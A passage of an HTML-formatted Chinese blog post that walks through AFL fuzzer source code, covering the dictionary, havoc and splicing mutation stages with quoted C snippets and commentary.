class="keyword">if</span> ((extras_cnt &gt; MAX_DET_EXTRAS &amp;&amp; <span class="built_in">UR</span>(extras_cnt) &gt;= MAX_DET_EXTRAS) ||</span><br><span class="line">        extras[j].len &gt; len - i ||  <span class="comment">// token长度超出剩余空间</span></span><br><span class="line">        !<span class="built_in">memcmp</span>(extras[j].data, out_buf + i, extras[j].len) ||  <span class="comment">// token已存在</span></span><br><span class="line">        !<span class="built_in">memchr</span>(eff_map + <span class="built_in">EFF_APOS</span>(i), <span class="number">1</span>, <span class="built_in">EFF_SPAN_ALEN</span>(i, extras[j].len))) &#123;</span><br><span class="line">      stage_max--;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行覆盖变异</span></span><br><span class="line">    <span class="built_in">memcpy</span>(out_buf + i, extras[j].data, extras[j].len);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行模糊测试</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    </span><br><span class="line">    stage_cur++;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 恢复被覆盖的内存</span></span><br><span class="line">  <span class="built_in">memcpy</span>(out_buf + i, in_buf + i, last_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对输入文件的每个字节位置都尝试字典token覆盖，当字典条目过多时，随机跳过一些条目，跳过长度不合适、已存在的条目</p><h5 id="插入变异"><a href="#插入变异" class="headerlink" title="插入变异"></a>插入变异</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Insertion of user-supplied extras. */</span></span><br><span class="line">stage_name  = <span class="string">&quot;user extras (insert)&quot;</span>;</span><br><span class="line">stage_short = <span class="string">&quot;ext_UI&quot;</span>;</span><br><span class="line">stage_cur   = <span class="number">0</span>;</span><br><span class="line">stage_max   = extras_cnt * (len + <span class="number">1</span>);</span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line">ex_tmp = <span class="built_in">ck_alloc</span>(len + MAX_DICT_FILE);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= len; i++) &#123;</span><br><span class="line">  stage_cur_byte = i;</span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; extras_cnt; j++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (len + extras[j].len &gt; MAX_FILE) &#123;</span><br><span class="line">      stage_max--; </span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Insert token */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ex_tmp + i, extras[j].data, extras[j].len);</span><br><span class="line">    <span class="comment">/* Copy tail */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ex_tmp + i + extras[j].len, out_buf + i, len - i);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, ex_tmp, len + extras[j].len)) &#123;</span><br><span class="line">      <span class="built_in">ck_free</span>(ex_tmp);</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    &#125;</span><br><span class="line">    stage_cur++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* Copy head */</span></span><br><span class="line">  ex_tmp[i] = out_buf[i];</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在每个可能位置插入字典token，不覆盖原有数据</p><h5 id="自动字典处理"><a href="#自动字典处理" class="headerlink" title="自动字典处理"></a>自动字典处理</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">stage_name  = <span class="string">&quot;auto extras (over)&quot;</span>;</span><br><span class="line">stage_max   = <span class="built_in">MIN</span>(a_extras_cnt, USE_AUTO_EXTRAS) * len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="built_in">MIN</span>(a_extras_cnt, USE_AUTO_EXTRAS); j++) &#123;</span><br><span class="line">    <span class="comment">// 三重过滤条件</span></span><br><span class="line">    <span class="keyword">if</span> (a_extras[j].len &gt; len - i ||  <span class="comment">// 长度检查</span></span><br><span class="line">        !<span class="built_in">memcmp</span>(a_extras[j].data, out_buf + i, a_extras[j].len) ||  <span class="comment">// 重复检查</span></span><br><span class="line">        !<span class="built_in">memchr</span>(eff_map + <span class="built_in">EFF_APOS</span>(i), <span class="number">1</span>, <span class="built_in">EFF_SPAN_ALEN</span>(i, a_extras[j].len))) &#123;  <span class="comment">// 效果检查</span></span><br><span class="line">      stage_max--;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行覆盖</span></span><br><span class="line">    last_len = a_extras[j].len;</span><br><span class="line">    <span class="built_in">memcpy</span>(out_buf + i, a_extras[j].data, last_len);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 测试变异结果</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    </span><br><span class="line">    stage_cur++;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 恢复被覆盖的内存</span></span><br><span class="line">  <span class="built_in">memcpy</span>(out_buf + i, in_buf + i, last_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>处理在位翻转阶段自动发现的字典条目，同时只在有效字节位才会覆盖处理</p><h3 id="HAVOC随机变异阶段"><a href="#HAVOC随机变异阶段" class="headerlink" title="HAVOC随机变异阶段"></a>HAVOC随机变异阶段</h3><p><code>UR</code>宏定义是一个取随机数的操作</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (<span class="built_in">UR</span>(<span class="number">15</span> + ((extras_cnt + a_extras_cnt) ? <span class="number">2</span> : <span class="number">0</span>))) &#123;</span><br></pre></td></tr></table></figure><p>如果有字典，则取<code>0-16</code>的选项，没字典，取<code>0-14</code>的选项</p><h4 id="位级变异操作-Cases-0-3"><a href="#位级变异操作-Cases-0-3" class="headerlink" title="位级变异操作 (Cases 0-3)"></a>位级变异操作 (Cases 0-3)</h4><p><strong>Case 0: 单比特翻转</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">FLIP_BIT</span>(out_buf, <span class="built_in">UR</span>(temp_len &lt;&lt; <span class="number">3</span>));</span><br></pre></td></tr></table></figure><ul><li><p>随机选择文件中的任意一个比特位进行翻转</p></li><li><p>这是最细粒度的变异，能够触发微小的语法变化</p></li></ul><p><strong>Case 1: 有趣字节值替换</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out_buf[<span class="built_in">UR</span>(temp_len)] = interesting_8[<span class="built_in">UR</span>(<span class="built_in">sizeof</span>(interesting_8))];</span><br></pre></td></tr></table></figure><ul><li><p>将随机位置的字节替换为预定义的”有趣值”</p></li><li><p>有趣值包括：0, 1, -1, 127, -128等边界值</p></li></ul><p><strong>Case 2: 有趣16位值替换</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(u16*)(out_buf + <span class="built_in">UR</span>(temp_len - <span class="number">1</span>)) = </span><br><span class="line"> interesting_16[<span class="built_in">UR</span>(<span class="built_in">sizeof</span>(interesting_16) &gt;&gt; <span class="number">1</span>)];</span><br></pre></td></tr></table></figure><ul><li><p>随机选择大端或小端字节序</p></li><li><p>替换为16位有趣值：0, 1, -1, 32767, -32768等</p></li></ul><p><strong>Case 3: 有趣32位值替换</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(u32*)(out_buf + <span class="built_in">UR</span>(temp_len - <span class="number">3</span>)) = </span><br><span class="line"> interesting_32[<span class="built_in">UR</span>(<span class="built_in">sizeof</span>(interesting_32) &gt;&gt; <span class="number">2</span>)];</span><br></pre></td></tr></table></figure><ul><li><p>同样支持大端&#x2F;小端随机选择</p></li><li><p>替换为32位有趣值</p></li></ul><h4 id="算术变异操作-Cases-4-9"><a href="#算术变异操作-Cases-4-9" class="headerlink" title="算术变异操作 (Cases 4-9)"></a>算术变异操作 (Cases 4-9)</h4><p><strong>Cases 4-5: 字节级算术运算</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">out_buf[<span class="built_in">UR</span>(temp_len)] -= <span class="number">1</span> + <span class="built_in">UR</span>(ARITH_MAX);  <span class="comment">// 减法</span></span><br><span class="line">out_buf[<span class="built_in">UR</span>(temp_len)] += <span class="number">1</span> + <span class="built_in">UR</span>(ARITH_MAX);  <span class="comment">// 加法</span></span><br></pre></td></tr></table></figure><p><strong>Cases 6-7: 16位算术运算</strong></p><p><strong>Cases 8-9: 32位算术运算</strong></p><h4 id="随机变异操作-Case-10"><a href="#随机变异操作-Case-10" class="headerlink" title="随机变异操作 (Case 10)"></a>随机变异操作 (Case 10)</h4><p><strong>Case 10: 随机字节异或</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out_buf[<span class="built_in">UR</span>(temp_len)] ^= <span class="number">1</span> + <span class="built_in">UR</span>(<span class="number">255</span>);</span><br></pre></td></tr></table></figure><h4 id="结构变异操作-Cases-11-14"><a href="#结构变异操作-Cases-11-14" class="headerlink" title="结构变异操作 (Cases 11-14)"></a>结构变异操作 (Cases 11-14)</h4><p><strong>Cases 11-12: 删除操作</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">del_len = <span class="built_in">choose_block_len</span>(temp_len - <span class="number">1</span>);</span><br><span class="line">del_from = <span class="built_in">UR</span>(temp_len - del_len + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">memmove</span>(out_buf + del_from, out_buf + del_from + del_len,</span><br><span class="line">        temp_len - del_from - del_len);</span><br></pre></td></tr></table></figure><ul><li><p>随机删除一个数据块</p></li><li><p>删除长度由choose_block_len智能选择</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> u32 <span class="title">choose_block_len</span><span class="params">(u32 limit)</span> </span>&#123;</span><br><span class="line">  u32 min_value, max_value;</span><br><span class="line">  u32 rlim = <span class="built_in">MIN</span>(queue_cycle, <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> (!run_over10m) rlim = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">switch</span> (<span class="built_in">UR</span>(rlim)) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:  min_value = <span class="number">1</span>;</span><br><span class="line">             max_value = HAVOC_BLK_SMALL;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:  min_value = HAVOC_BLK_SMALL;</span><br><span class="line">             max_value = HAVOC_BLK_MEDIUM;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>: </span><br><span class="line">             <span class="keyword">if</span> (<span class="built_in">UR</span>(<span class="number">10</span>)) &#123;</span><br><span class="line">               min_value = HAVOC_BLK_MEDIUM;</span><br><span class="line">               max_value = HAVOC_BLK_LARGE;</span><br><span class="line">             &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               min_value = HAVOC_BLK_LARGE;</span><br><span class="line">               max_value = HAVOC_BLK_XL;</span><br><span class="line">             &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (min_value &gt;= limit) min_value = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> min_value + <span class="built_in">UR</span>(<span class="built_in">MIN</span>(max_value, limit) - min_value + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>根据当前的循环数，随机选择一个策略</p><p>第一层（case 0）：小块</p><ul><li><p>范围：1 到 HAVOC_BLK_SMALL (32字节)</p></li><li><p>适用于精细变异</p></li></ul><p>第二层（case 1）：中等块</p><ul><li><p>范围：HAVOC_BLK_SMALL (32) 到 HAVOC_BLK_MEDIUM (128字节)</p></li><li><p>平衡效率和覆盖面</p></li></ul><p>第三层（default）：大块策略</p><ul><li><p>90%概率：HAVOC_BLK_MEDIUM (128) 到 HAVOC_BLK_LARGE (1500字节)</p></li><li><p>10%概率：HAVOC_BLK_LARGE (1500) 到 HAVOC_BLK_XL (32768字节)</p></li></ul></blockquote></li></ul><p><strong>Case 13: 克隆&#x2F;插入操作</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">u8  actually_clone = <span class="built_in">UR</span>(<span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span> (actually_clone) &#123;</span><br><span class="line">  <span class="comment">// 75%概率：克隆现有数据块</span></span><br><span class="line">  <span class="built_in">memcpy</span>(new_buf + clone_to, out_buf + clone_from, clone_len);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 25%概率：插入常量字节块</span></span><br><span class="line">  <span class="built_in">memset</span>(new_buf + clone_to, <span class="built_in">UR</span>(<span class="number">2</span>) ? <span class="built_in">UR</span>(<span class="number">256</span>) : out_buf[<span class="built_in">UR</span>(temp_len)], clone_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Case 14: 覆写操作</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">UR</span>(<span class="number">4</span>)) &#123;</span><br><span class="line">  <span class="comment">// 75%概率：用现有数据块覆写</span></span><br><span class="line">  <span class="built_in">memmove</span>(out_buf + copy_to, out_buf + copy_from, copy_len);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 25%概率：用常量值覆写</span></span><br><span class="line">  <span class="built_in">memset</span>(out_buf + copy_to, <span class="built_in">UR</span>(<span class="number">2</span>) ? <span class="built_in">UR</span>(<span class="number">256</span>) : out_buf[<span class="built_in">UR</span>(temp_len)], copy_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="字典变异操作-Cases-15-16"><a href="#字典变异操作-Cases-15-16" class="headerlink" title="字典变异操作 (Cases 15-16)"></a>字典变异操作 (Cases 15-16)</h4><p><strong>Case 15: 字典覆写</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!extras_cnt || (a_extras_cnt &amp;&amp; <span class="built_in">UR</span>(<span class="number">2</span>))) &#123;</span><br><span class="line">  <span class="comment">// 使用自动检测的extras</span></span><br><span class="line">  <span class="built_in">memcpy</span>(out_buf + insert_at, a_extras[use_extra].data, extra_len);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 使用用户提供的字典</span></span><br><span class="line">  <span class="built_in">memcpy</span>(out_buf + insert_at, extras[use_extra].data, extra_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Case 16: 字典插入</strong></p><p>类似Case 15，但是插入而非覆写需要重新分配内存并调整文件大小</p><h4 id="变异迭代后处理"><a href="#变异迭代后处理" class="headerlink" title="变异迭代后处理"></a>变异迭代后处理</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, temp_len))</span><br><span class="line">  <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* out_buf might have been mangled a bit, so let&#x27;s restore it to its</span></span><br><span class="line"><span class="comment">   original size and shape. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (temp_len &lt; len) out_buf = <span class="built_in">ck_realloc</span>(out_buf, len);</span><br><span class="line">temp_len = len;</span><br><span class="line"><span class="built_in">memcpy</span>(out_buf, in_buf, len);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If we&#x27;re finding new stuff, let&#x27;s run for a bit longer, limits</span></span><br><span class="line"><span class="comment">   permitting. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (queued_paths != havoc_queued) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (perf_score &lt;= HAVOC_MAX_MULT * <span class="number">100</span>) &#123;</span><br><span class="line">    stage_max  *= <span class="number">2</span>;</span><br><span class="line">    perf_score *= <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  havoc_queued = queued_paths;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果找到新的执行路径，就会对剩余执行次数以及性能评分进行一个翻倍，对有效输入投入更多计算资源</p><h3 id="SPLICING变异"><a href="#SPLICING变异" class="headerlink" title="SPLICING变异"></a>SPLICING变异</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (use_splicing &amp;&amp; splice_cycle++ &lt; SPLICE_CYCLES &amp;&amp;</span><br><span class="line">    queued_paths &gt; <span class="number">1</span> &amp;&amp; queue_cur-&gt;len &gt; <span class="number">1</span>) &#123;</span><br></pre></td></tr></table></figure><p>splicing功能开启且次数限制15次，队列中至少两个输入</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Pick a random queue entry and seek to it. Don&#x27;t splice with yourself. */</span></span><br><span class="line"><span class="keyword">do</span> &#123; tid = <span class="built_in">UR</span>(queued_paths); &#125; <span class="keyword">while</span> (tid == current_entry);</span><br><span class="line"></span><br><span class="line">splicing_with = tid;</span><br><span class="line">target = queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (tid &gt;= <span class="number">100</span>) &#123; target = target-&gt;next_100; tid -= <span class="number">100</span>; &#125;</span><br><span class="line"><span class="keyword">while</span> (tid--) target = target-&gt;next;</span><br></pre></td></tr></table></figure><p>随机选择一个队列，但不能是两个相同的队列，每100个队列设置一个快速访问点</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (target &amp;&amp; (target-&gt;len &lt; <span class="number">2</span> || target == queue_cur)) &#123;</span><br><span class="line">  target = target-&gt;next;</span><br><span class="line">  splicing_with++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>确保目标文件长度合适且不是自己</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">locate_diffs</span>(in_buf, new_buf, <span class="built_in">MIN</span>(len, target-&gt;len), &amp;f_diff, &amp;l_diff);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">locate_diffs</span><span class="params">(u8* ptr1, u8* ptr2, u32 len, s32* first, s32* last)</span> </span>&#123;</span><br><span class="line">  s32 f_loc = <span class="number">-1</span>;</span><br><span class="line">  s32 l_loc = <span class="number">-1</span>;</span><br><span class="line">  u32 pos;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (pos = <span class="number">0</span>; pos &lt; len; pos++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(ptr1++) != *(ptr2++)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (f_loc == <span class="number">-1</span>) f_loc = pos;</span><br><span class="line">      l_loc = pos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *first = f_loc;</span><br><span class="line">  *last = l_loc;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逐字节比较两个缓冲区，<code>f_loc</code>记录第一个不同字节的位置，<code>l_loc</code>记录最后一个不同字节的位置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (f_diff &lt; <span class="number">0</span> || l_diff &lt; <span class="number">2</span> || f_diff == l_diff) &#123;</span><br><span class="line">  <span class="built_in">ck_free</span>(new_buf);</span><br><span class="line">  <span class="keyword">goto</span> retry_splicing;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Split somewhere between the first and last differing byte. */</span></span><br><span class="line">split_at = f_diff + <span class="built_in">UR</span>(l_diff - f_diff);</span><br></pre></td></tr></table></figure><p>拼接点的选择：</p><ul><li><p>如果文件完全相同(f_diff &lt; 0)，重新选择目标</p></li><li><p>如果差异太小(l_diff &lt; 2或f_diff &#x3D;&#x3D; l_diff)，重新选择</p></li><li><p>在首尾差异之间随机选择拼接点，确保拼接有意义</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Do the thing. */</span></span><br><span class="line">len = target-&gt;len;</span><br><span class="line"><span class="built_in">memcpy</span>(new_buf, in_buf, split_at);</span><br><span class="line">in_buf = new_buf;</span><br><span class="line"></span><br><span class="line"><span class="built_in">ck_free</span>(out_buf);</span><br><span class="line">out_buf = <span class="built_in">ck_alloc_nozero</span>(len);</span><br><span class="line"><span class="built_in">memcpy</span>(out_buf, in_buf, len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> havoc_stage;</span><br></pre></td></tr></table></figure><p>拼接操作开始：</p><ul><li><strong>前半部分</strong>: 复制当前输入的前split_at字节到新缓冲区</li><li><strong>后半部分</strong>: 目标文件的后半部分已经在new_buf中</li><li><strong>缓冲区切换</strong>: 将in_buf指向新的拼接结果</li><li><strong>重新进入havoc</strong>: 对拼接结果进行随机变异</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">abandon_entry:</span><br><span class="line"></span><br><span class="line">splicing_with = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Update pending_not_fuzzed count if we made it through the calibration</span></span><br><span class="line"><span class="comment">   cycle and have not seen this entry before. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!stop_soon &amp;&amp; !queue_cur-&gt;cal_failed &amp;&amp; !queue_cur-&gt;was_fuzzed) &#123;</span><br><span class="line">  queue_cur-&gt;was_fuzzed = <span class="number">1</span>;</span><br><span class="line">  pending_not_fuzzed--;</span><br><span class="line">  <span class="keyword">if</span> (queue_cur-&gt;favored) pending_favored--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">munmap</span>(orig_in, queue_cur-&gt;len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_buf != orig_in) <span class="built_in">ck_free</span>(in_buf);</span><br><span class="line"><span class="built_in">ck_free</span>(out_buf);</span><br><span class="line"><span class="built_in">ck_free</span>(eff_map);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret_val;</span><br></pre></td></tr></table></figure><p>最后清理资源就能退出函数了</p><h2 id="main函数剩余部分"><a href="#main函数剩余部分" class="headerlink" title="main函数剩余部分"></a>main函数剩余部分</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))</span><br><span class="line">    <span class="built_in">sync_fuzzers</span>(use_argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同步实例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!stop_soon &amp;&amp; exit_1) stop_soon = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (stop_soon) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">queue_cur = queue_cur-&gt;next;</span><br><span class="line">current_entry++;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* If we stopped programmatically, we kill the forkserver and the current runner. </span></span><br><span class="line"><span class="comment">   If we stopped manually, this is done by the signal handler. */</span></span><br><span class="line"><span class="keyword">if</span> (stop_soon == <span 